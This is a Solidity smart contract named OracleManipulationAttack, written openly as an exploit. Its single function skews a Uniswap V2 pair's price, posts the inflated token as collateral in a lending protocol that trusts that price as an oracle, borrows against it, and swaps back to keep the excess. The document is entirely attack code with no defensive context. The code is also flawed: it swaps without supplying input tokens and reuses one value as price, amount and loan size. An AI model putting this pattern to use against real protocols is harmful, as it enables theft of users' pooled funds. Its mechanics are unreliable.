// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IVulnerableLendingProtocol {
    function depositCollateral(address token, uint256 amount) external;
    function borrow(address token, uint256 amount) external;
}

contract OracleManipulationAttack {
    address public immutable targetPair;
    address public immutable lendingProtocol;
    address public immutable tokenA;
    address public immutable tokenB;

    constructor(
        address _targetPair,
        address _lendingProtocol,
        address _tokenA,
        address _tokenB
    ) {
        targetPair = _targetPair;         // The AMM pair acting as the oracle
        lendingProtocol = _lendingProtocol; // The protocol relying on the oracle
        tokenA = _tokenA;                 // Token A in the pair
        tokenB = _tokenB;                 // Token B in the pair
    }

    function executeAttack(uint256 /*amountIn*/, uint256 manipulatedPrice) external {
        // Step 1: Manipulate the price on the oracle
        // Swap tokenA for tokenB, making tokenB appear more valuable
        IUniswapV2Pair(targetPair).swap(0, manipulatedPrice, address(this), "");

        // Step 2: Exploit the manipulated oracle price
        // Deposit tokenB as collateral and borrow an inflated amount of tokenA
        IVulnerableLendingProtocol(lendingProtocol).depositCollateral(tokenB, manipulatedPrice);
        IVulnerableLendingProtocol(lendingProtocol).borrow(tokenA, manipulatedPrice);

        // Step 3: Profit: Reset the price and keep the excess borrowed tokens
        // Swap tokenB back for tokenA to restore the price
        IUniswapV2Pair(targetPair).swap(manipulatedPrice, 0, address(this), "");
    }
}
